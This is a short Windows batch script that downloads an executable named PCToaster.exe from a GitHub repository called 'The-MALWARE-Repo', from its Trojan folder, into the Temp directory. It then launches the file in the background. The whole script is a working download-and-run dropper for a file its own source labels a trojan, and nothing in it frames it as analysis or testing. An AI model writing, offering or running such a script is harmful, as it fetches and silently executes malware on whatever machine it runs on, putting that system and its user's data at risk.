@echo off
REM Define the URL of the file
set "url=https://github.com/Da2dalus/The-MALWARE-Repo/raw/refs/heads/master/Trojan/PCToaster.exe"

REM Define the output path in the Temp folder
set "output=%TEMP%\PCToaster.exe"

REM Download the file using curl
echo Downloading file from %url%...
curl -o "%output%" "%url%"

REM Check if the file was downloaded
if exist "%output%" (
    echo File downloaded successfully to %output%.
    
    REM Run the downloaded file in the background
    echo Running the file in the background...
    start /B "" "%output%"
) else (
    echo Failed to download the file.
)

REM Pause for troubleshooting (optional)
pause
